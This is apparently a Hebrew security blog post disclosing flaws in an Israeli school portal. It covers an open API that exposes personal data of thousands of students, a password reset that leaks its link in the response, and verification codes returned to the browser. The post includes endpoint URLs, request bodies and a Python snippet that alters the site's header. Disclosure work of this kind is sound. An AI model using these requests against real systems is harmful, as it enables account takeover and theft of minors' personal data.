---
layout: post
title: בעיות אבטחה בפלטפורמת "פורטל החינוך"
tags: [web, information disclosure, unauthorized access]
---
### גישה לפרטי התלמידים

לאחר רפרוף בקוד האתר הגעתי לקטע הקוד הבא:

![](https://i.imgur.com/KYzAc58.png)
בקטע ניתן לראות פונקציה המחזירה נתונים מממאגר התלמידים לפי פילטר מסויים, הרכבתי את הurl המצוי בקטע הקוד והגעתי אל הכתבות הבאה:

<!--more-->

```
https://eduil.org/api/students/GetAll?searchQuery= 
```

![](https://i.imgur.com/77TfQcY.png)

החלטתי להכנס אליו ולראות את התוצאות, אך לא קיבלתי תשובה לזמן מה, החלטתי לנסות להכניס ערך לפרמטר `searchQuery` הכנסתי את התו `x`.

וברגע שקיבלתי תגובה מהשרת הבנתי שנגלה לעיני בעיה חמורה, עשרות ואף מאות רשומות המכילות פרטים רגישים הופיעו על המסך, התחלתי לשחק עם ערך הפרמטר, הגעתי למסקנה שכל רשומה שיש בשם הפרטי / משפחה שלה או בשם המשתמש את ערך הפרמטר תוחזר.

הכנסתי את התו `/` מכיוון שהוא לא קיים בשמות הנמצאים ברשומות וקיבלתי את התשובה הבאה:

![](https://i.imgur.com/qCJWRxg.png)

תשובה זאת העידה על כך שיש כ **13735** תלמידים במאגר.

על מנת לצפות בכל התלמידים הנמצאים במאגר הכנסתי לערך את התו . אשר נמצא בכל שם משתמש במאגר ואכן פעולה זו עבדה, נחשפו לעיני פרטים אישיים של מעל כ 13 אלף תלמידים.

הפרטים אשר נחשפו כוללים:

- **תעודת זהות**
- מספר הטלפון האישי
- מזהה בית הספר (אשר ניתן להצליב עם נתוני המשוב ולקבל את שם בית הספר)
- המייל הפרטי
- שם המשתמש
- שם פרטי
- שם משפחה
- עיר מגורים

**איפוס סיסמה ללא צורך באימות:**

כאשר אנו ניגשים לאפס את סיסמת המשתמש מתבצעת בקשה המכילה את מזהה המשתמש

```
POST https://eduil.org/api/localaccount/ForgotPassword HTTP/1.1
```

```js
{username: "CENSORED@office.eduil.org"}
```

התשובה המתקבלת

```js
{
    "localPasswordResetToken":
    {
        "resetToken": "CENSORED",
        "userId": "CENSORED",
        "personalEmail": "CENSORED@gmail.com",
        "maskedEmail": "CENSORED@gmail.com",
        "callbackUrl": "https://eduil.org/login/passwordreset?userid=CENSORED&token=CENSORED"
    },
    "isSuccess": true,
    "correlationId": null,
    "message": null
}
```

השדה המעניין הוא `callbackUrl` אשר מחזיר לנו את קישור האימות אשר נשלח למייל המקושר לחשבון, הקישור מאפשר לנו לאפס את סיסמת המשתמש ומאפשר גישה לחשבון

![](https://i.imgur.com/ublpoG7.png)

![](https://i.imgur.com/O9RCj0B.png)

**אימות מייל / טלפון ללא אימות**

כאשר אנו מעדכנים את מספר הטלפון / כתובת המייל המקושרים לחשבון אנו נשאלים באיזו דרך היינו רוצים לקבל את קוד האימות. אציג לכם מקרה מאחורי שירות רגיל ואילו פעולות מתרחשות מאחוריו (תיאורטית):

![](https://i.imgur.com/XVMomh4.png)

המקרה שלנו טיפה שונה, אצלנו אין אימות פרטים ובנוסף המזהה לא נשלח רק אל הטלפון / מייל אלא הוא מוחזר גם אל הדפדפן ופעולה זאת מאפשרת לנו לאמת את הפרטים ללא כל צורך בגישה לטלפון / מייל

![](https://i.imgur.com/Om2XvMd.png)

ניתן לראות את הבקשה לעדכון מספר הטלפון של המשתמש:

```
POST https://eduil.org/api/userdata/UpdatePersonalPhoneTokenRequest HTTP/1.1
```

```js
{
    "username": "CENSORED@office.eduil.org",
    "phoneNumber": "This isn't a real phone number",
    "educationObjectType": "Student"
}
```

אך התגובה לבקשה היא החלק הבעייתי:

```js
{
    "updatePersonalPhoneNumberToken":
    {
        "confirmationToken": "711746",
        "userId": "CENSORED",
        "phoneNumber": "This isn't a real phone number",
        "callbackUrl": null
    },
    "isSuccess": true,
    "correlationId": null,
    "message": null
}
```

ניתן לראות בגוף התגובה את המפתח confirmationToken אשר מכיל בתוכו את הערך של קוד האימות האמור להישלח למספר, כאשר נזין אותו לשדה המבקש את קוד האימות ונלחץ אישור נקבל הודעה אשר מתריעה על כך שהפרטים עודכנו.

![](https://i.imgur.com/ky6ryW3.png)

גישה לנתוני המשוב

לאחר חיטוט מתמשך בקוד האתר הגעתי לקובץ המכיל קוד המקשר את המערכת למערכת המשוב

הרכבתי url עם נתונים על התיכון, השכבה ומספר הכיתה בה אני לומד ואכן קיבלתי את הפרטים הנכונים.

הפרטים אשר הצלחתי לראות לא מציגים משהו מיוחד אלא דוח פעילות של שיעורים בכיתה:

- שם המקצוע
- נושא השיעור
- שם המורה
- האם היו שב

```
https://eduil.org/api/mashov/ClassAssignments?instituteSymbol={school_id}&classroomNumber={class_number}&classroomCode={grade_number}
```

ניתן להציב את הפרטים של כל בית ספר המחובר למערכת המשוב ולקבל את המידע

גישה לנתוני מסודות בערים

על ידי שימוש ב endpoint הבא:

```
https://eduil.org/api/municipalities/schools?cityName={city_name}
```

נקבל רשימה של שמות בתי הספר בעיר מסויימת, רשימה זו כוללת:

- שם המוסד
- סוג המוסד
- **מזהה המוסד**
- שם המנהל

### דברים נוספים שראיתי:

המשכתי לחקור והגעתי ל endpoint הבא ב api:

```
https://eduil.org/api/communities/GetAllAvailable
```

כאשר ניגשים אליו מקבלים מידע על הקבוצות הקיימות ובמידע אשר היה שם ניתן לראות מי יוצר הקבוצה ואת פרטיו המלאים.

המידע אשר קיבלתי הכיל קבוצה לדוגמא ושם המשתמש אשר יצר את הקבוצה היה משתמש האדמין. כמובן שעל ידי ניצול השיטה שהצגתי בעמודים הקודמים ניתן להכנס למשתמש על ידי איפוס סיסמתו (פעולה שלא ביצעתי).

![](https://i.imgur.com/RNWjgiW.png)
*** אני משער שקיימות עוד בעיות, בעיקר בעיות הקשורות בהרשאות המשתמש אך לא המשכתי לבדוק מכיוון שפעולת בדיקה כזו תאלץ אותי לערוך את המשתמש ויכולה לגרום לפגיעה במערכת ***

### תוספת: (5/11/2018)

לאחר שהבעיות הקודמות תוקנו אותגרתי לחפש בעיה חדשה, באותו הרגע אמרתי לעצמי challenge accepted וברגע שחזרתי מהלימודים התחלתי לחפש, לאחר זמן קצר הצלחתי לשנות את הnav bar של העמוד

![](https://i.imgur.com/ujnWfm0.png)```

```py
sess.post('https://eduil.org/api/tenantdata/', json={
    'headerStyle': {
        'id': 15,
        'displayName': None,
        'logoPhoto': b64encode(open('xyz.png', 'rb').read()).decode(),
        'logoPosition': 'right',
        'logoUrl': 'https://github.com/avramit/',
        'backgroundColorFrom': '#FF0000',
        'backgroundColorTo': '#000000',
        height: 70
    }
})

# https://eduil.org/tenant-style.module.chunk.js
```

**כיום (שנה לאחר הדיווח) יש במאגר כ 62981 תלמידים**